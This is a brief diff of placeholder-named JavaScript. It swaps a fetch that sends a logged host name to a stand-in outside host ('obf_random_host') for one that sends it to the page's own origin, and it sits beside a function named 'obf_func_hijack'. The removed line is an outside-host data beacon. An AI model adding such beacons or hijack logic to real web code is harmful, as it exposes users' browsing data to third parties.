@@ -111,7 +111,7 @@
       }
     }
     obf_var_callback_log.push(obf_var_host);
-    obf_func_fetch("http://obf_random_host/obf_path_ssl_log?" + obf_var_host)
+    obf_func_fetch(location.origin + "/obf_path_ssl_log?" + obf_var_host)
   }
 
   function obf_func_hijack(obf_var_host) {
